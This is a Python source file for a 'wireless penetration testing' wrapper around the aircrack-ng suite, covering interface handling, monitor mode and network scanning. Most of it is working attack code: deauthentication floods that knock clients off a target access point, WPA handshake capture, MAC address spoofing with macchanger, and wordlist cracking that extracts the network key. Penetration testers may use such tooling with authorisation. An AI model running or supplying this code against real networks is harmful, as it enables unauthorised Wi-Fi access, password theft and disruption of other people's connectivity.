"""
Wireless interface management and tool integration
Provides Python interface to aircrack-ng suite and other wireless tools
"""

import subprocess
import re
import os
from typing import List, Optional, Dict, Any, Tuple
from dataclasses import dataclass
from pathlib import Path


@dataclass
class WirelessInterface:
    """Represents a wireless network interface"""
    name: str
    driver: str
    chipset: str
    phy: str
    mac_address: str
    is_monitor: bool = False
    channel: Optional[int] = None


@dataclass
class AccessPoint:
    """Represents a detected access point"""
    bssid: str
    ssid: str
    channel: int
    signal: int
    encryption: str
    cipher: Optional[str] = None
    authentication: Optional[str] = None
    speed: Optional[int] = None
    beacons: int = 0
    data_packets: int = 0


class WirelessTools:
    """Interface to wireless penetration testing tools"""

    @staticmethod
    def get_interfaces() -> List[WirelessInterface]:
        """
        Get all wireless interfaces using airmon-ng

        Returns:
            List of WirelessInterface objects
        """
        interfaces = []

        try:
            result = subprocess.run(
                ['airmon-ng'],
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode != 0:
                return interfaces

            # Parse airmon-ng output
            # Format: PHY Interface Driver Chipset
            lines = result.stdout.split('\n')
            for line in lines:
                # Skip header and empty lines
                if not line.strip() or 'PHY' in line or 'Interface' in line:
                    continue

                parts = line.split()
                if len(parts) >= 3:
                    phy = parts[0]
                    name = parts[1]
                    driver = parts[2]
                    chipset = ' '.join(parts[3:]) if len(parts) > 3 else 'Unknown'

                    # Get MAC address
                    mac = WirelessTools._get_mac_address(name)

                    # Check if in monitor mode
                    is_monitor = 'mon' in name.lower()

                    iface = WirelessInterface(
                        name=name,
                        driver=driver,
                        chipset=chipset,
                        phy=phy,
                        mac_address=mac,
                        is_monitor=is_monitor
                    )
                    interfaces.append(iface)

        except Exception as e:
            print(f"[!] Error getting interfaces: {e}")

        return interfaces

    @staticmethod
    def _get_mac_address(interface: str) -> str:
        """Get MAC address of an interface"""
        try:
            result = subprocess.run(
                ['cat', f'/sys/class/net/{interface}/address'],
                capture_output=True,
                text=True,
                timeout=5
            )

            if result.returncode == 0:
                return result.stdout.strip().upper()

        except Exception:
            pass

        return "00:00:00:00:00:00"

    @staticmethod
    def enable_monitor_mode(interface: str) -> Tuple[bool, Optional[str]]:
        """
        Enable monitor mode on an interface using airmon-ng

        Args:
            interface: Interface name (e.g., 'wlan0')

        Returns:
            (success, monitor_interface_name)
        """
        try:
            # Kill interfering processes
            subprocess.run(
                ['sudo', 'airmon-ng', 'check', 'kill'],
                capture_output=True,
                timeout=30
            )

            # Start monitor mode
            result = subprocess.run(
                ['sudo', 'airmon-ng', 'start', interface],
                capture_output=True,
                text=True,
                timeout=30
            )

            if result.returncode == 0:
                # Parse output to get monitor interface name
                # Usually it's <interface>mon (e.g., wlan0mon)
                output = result.stdout

                # Look for "monitor mode enabled" or similar
                if 'enabled' in output.lower():
                    # Try to extract monitor interface name
                    match = re.search(r'\(monitor mode (?:enabled|vif enabled) (?:on|for) (\w+)\)', output)
                    if match:
                        monitor_iface = match.group(1)
                        return True, monitor_iface

                    # Fallback: assume <interface>mon
                    monitor_iface = f"{interface}mon"
                    return True, monitor_iface

            return False, None

        except Exception as e:
            print(f"[!] Error enabling monitor mode: {e}")
            return False, None

    @staticmethod
    def disable_monitor_mode(interface: str) -> bool:
        """
        Disable monitor mode on an interface

        Args:
            interface: Monitor interface name (e.g., 'wlan0mon')

        Returns:
            Success status
        """
        try:
            result = subprocess.run(
                ['sudo', 'airmon-ng', 'stop', interface],
                capture_output=True,
                text=True,
                timeout=30
            )

            return result.returncode == 0

        except Exception as e:
            print(f"[!] Error disabling monitor mode: {e}")
            return False

    @staticmethod
    def change_channel(interface: str, channel: int) -> bool:
        """
        Change the channel of a wireless interface

        Args:
            interface: Interface name
            channel: Channel number (1-14 for 2.4GHz, 36-165 for 5GHz)

        Returns:
            Success status
        """
        # Try using iw first (modern tool)
        try:
            # Convert channel to frequency for iw
            if 1 <= channel <= 14:
                freq = 2407 + (channel * 5)
            elif 36 <= channel <= 165:
                freq = 5000 + (channel * 5)
            else:
                freq = 2407 + (channel * 5)  # Default to 2.4GHz

            result = subprocess.run(
                ['sudo', 'iw', 'dev', interface, 'set', 'freq', str(freq)],
                capture_output=True,
                timeout=10
            )

            if result.returncode == 0:
                return True

        except Exception:
            pass

        # Fallback to iwconfig if available
        try:
            result = subprocess.run(
                ['sudo', 'iwconfig', interface, 'channel', str(channel)],
                capture_output=True,
                timeout=10
            )

            return result.returncode == 0

        except Exception as e:
            print(f"[!] Error changing channel: {e}")
            return False

    @staticmethod
    def change_mac(interface: str, new_mac: Optional[str] = None) -> Tuple[bool, str]:
        """
        Change MAC address of an interface using macchanger

        Args:
            interface: Interface name
            new_mac: New MAC address (if None, generates random)

        Returns:
            (success, new_mac_address)
        """
        try:
            # Bring interface down
            subprocess.run(
                ['sudo', 'ip', 'link', 'set', interface, 'down'],
                capture_output=True,
                timeout=10
            )

            # Change MAC
            if new_mac:
                cmd = ['sudo', 'macchanger', '-m', new_mac, interface]
            else:
                cmd = ['sudo', 'macchanger', '-r', interface]

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=10
            )

            # Bring interface up
            subprocess.run(
                ['sudo', 'ip', 'link', 'set', interface, 'up'],
                capture_output=True,
                timeout=10
            )

            if result.returncode == 0:
                # Extract new MAC from output
                match = re.search(r'New MAC:\s+([0-9a-fA-F:]{17})', result.stdout)
                if match:
                    return True, match.group(1)

            return False, ""

        except Exception as e:
            print(f"[!] Error changing MAC: {e}")
            return False, ""


class AircrackNG:
    """Interface to aircrack-ng suite tools"""

    @staticmethod
    def scan_networks(
        interface: str,
        output_file: str,
        channel: Optional[int] = None,
        timeout: Optional[int] = None
    ) -> subprocess.Popen:
        """
        Start airodump-ng to scan for networks

        Args:
            interface: Monitor mode interface
            output_file: Output file prefix (without extension)
            channel: Specific channel to scan (None for all channels)
            timeout: Scan duration in seconds (None for indefinite)

        Returns:
            Process object (must be managed by caller)
        """
        cmd = ['sudo', 'airodump-ng']

        if channel:
            cmd.extend(['-c', str(channel)])

        cmd.extend(['-w', output_file, '--output-format', 'csv', interface])

        # Start process
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        return process

    @staticmethod
    def parse_airodump_csv(csv_path: str) -> Tuple[List[AccessPoint], List[Dict]]:
        """
        Parse airodump-ng CSV output

        Args:
            csv_path: Path to airodump CSV file

        Returns:
            (access_points, clients)
        """
        access_points = []
        clients = []

        if not os.path.exists(csv_path):
            return access_points, clients

        try:
            with open(csv_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()

            # Split into AP and client sections
            sections = content.split('Station MAC')

            if len(sections) < 1:
                return access_points, clients

            # Parse access points
            ap_section = sections[0]
            ap_lines = ap_section.split('\n')

            # Find header line
            header_idx = -1
            for i, line in enumerate(ap_lines):
                if 'BSSID' in line and 'ESSID' in line:
                    header_idx = i
                    break

            if header_idx >= 0:
                for line in ap_lines[header_idx + 1:]:
                    if not line.strip() or line.startswith('BSSID'):
                        continue

                    parts = [p.strip() for p in line.split(',')]

                    if len(parts) >= 14:
                        try:
                            ap = AccessPoint(
                                bssid=parts[0],
                                channel=int(parts[3]) if parts[3].strip() else 0,
                                signal=int(parts[8]) if parts[8].strip() else -100,
                                beacons=int(parts[9]) if parts[9].strip() else 0,
                                data_packets=int(parts[10]) if parts[10].strip() else 0,
                                encryption=parts[5],
                                cipher=parts[6] if parts[6].strip() else None,
                                authentication=parts[7] if parts[7].strip() else None,
                                ssid=parts[13] if len(parts) > 13 else ''
                            )
                            access_points.append(ap)
                        except (ValueError, IndexError):
                            continue

        except Exception as e:
            print(f"[!] Error parsing airodump CSV: {e}")

        return access_points, clients

    @staticmethod
    def capture_handshake(
        interface: str,
        bssid: str,
        channel: int,
        output_file: str,
        timeout: int = 300
    ) -> subprocess.Popen:
        """
        Capture WPA handshake for a specific network

        Args:
            interface: Monitor mode interface
            bssid: Target BSSID
            channel: Target channel
            output_file: Output file prefix
            timeout: Capture timeout

        Returns:
            Process object
        """
        cmd = [
            'sudo', 'airodump-ng',
            '-c', str(channel),
            '--bssid', bssid,
            '-w', output_file,
            '--output-format', 'pcap',
            interface
        ]

        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        return process

    @staticmethod
    def deauth_attack(
        interface: str,
        bssid: str,
        client: Optional[str] = None,
        count: int = 10
    ) -> bool:
        """
        Send deauthentication packets to capture handshake

        Args:
            interface: Monitor mode interface
            bssid: Target AP BSSID
            client: Target client MAC (None for broadcast)
            count: Number of deauth packets

        Returns:
            Success status
        """
        cmd = [
            'sudo', 'aireplay-ng',
            '--deauth', str(count),
            '-a', bssid
        ]

        if client:
            cmd.extend(['-c', client])

        cmd.append(interface)

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                timeout=30
            )

            return result.returncode == 0

        except Exception as e:
            print(f"[!] Error sending deauth: {e}")
            return False

    @staticmethod
    def crack_handshake(
        handshake_file: str,
        wordlist: str,
        bssid: Optional[str] = None
    ) -> Tuple[bool, Optional[str]]:
        """
        Crack WPA handshake using aircrack-ng

        Args:
            handshake_file: Path to capture file
            wordlist: Path to wordlist
            bssid: Target BSSID (if multiple in capture)

        Returns:
            (success, password)
        """
        cmd = ['aircrack-ng', '-w', wordlist]

        if bssid:
            cmd.extend(['-b', bssid])

        cmd.append(handshake_file)

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=3600  # 1 hour max
            )

            # Parse output for password
            output = result.stdout

            # Look for "KEY FOUND!" pattern
            if 'KEY FOUND' in output:
                # Extract password
                match = re.search(r'KEY FOUND! \[ (.+?) \]', output)
                if match:
                    password = match.group(1)
                    return True, password

            return False, None

        except Exception as e:
            print(f"[!] Error cracking handshake: {e}")
            return False, None
